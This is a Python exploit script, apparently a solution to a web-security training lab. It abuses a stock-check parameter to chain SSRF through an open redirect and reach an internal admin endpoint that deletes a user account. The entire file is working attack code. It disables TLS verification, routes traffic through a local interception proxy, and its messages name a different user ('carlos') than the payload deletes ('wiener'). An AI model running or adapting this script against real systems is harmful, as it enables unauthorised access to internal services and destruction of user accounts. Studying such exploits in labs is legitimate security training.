import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def ssrf_open_redirect_exploit(url):
    path = "/product/stock"

    delete_user_payload = "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=wiener"

    delete_res = requests.post(url+path, data = {'stockApi' : delete_user_payload}, proxies=proxies, verify=False)

    if 'User deleted sucessfully!' in delete_res.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip();
    except IndexError:
        print("[-] invalid input")
        print("[-] usage: %s <url>"%sys.argv[0])
        print("exiting...")
        sys.exit(-1)

    attack_result = ssrf_open_redirect_exploit(url)

    if attack_result:
        print("[+] user carlos deleted")
    else:
        print("[-] failed to delete user carlos")

    print("exiting...")
    sys.exit(-1)